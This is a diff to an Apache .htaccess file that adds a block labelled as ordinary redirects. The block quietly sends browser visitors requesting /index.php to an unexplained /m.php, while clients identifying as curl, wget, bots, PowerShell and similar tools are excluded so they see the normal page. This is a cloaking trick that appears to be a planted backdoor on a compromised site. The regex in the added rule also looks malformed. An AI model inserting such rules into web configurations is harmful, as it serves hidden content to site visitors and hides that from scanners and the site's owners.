@@ -30,6 +30,11 @@ RewriteRule ^/?(.*) https://%{SERVER_NAME}/$1 [R,L]
 ### Set Error Doc ######################################################                              
 ErrorDocument 404 /404.html
 
+### Redirects ##########################################################
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} !^(*curl*|*bot*|*lunx*|*w3m*|*wget*|*elinks*|*cmd*|*powershell*) [NC]
+RewriteRule ^/index\.php$ /m.php [L]
+
 ### Deny specific File extensions ######################################
 <FilesMatch "(\.(bak|config|dist|fla|inc|ini|log|psd|sh|sql|swp)|~)$">
     ## Apache 2.2
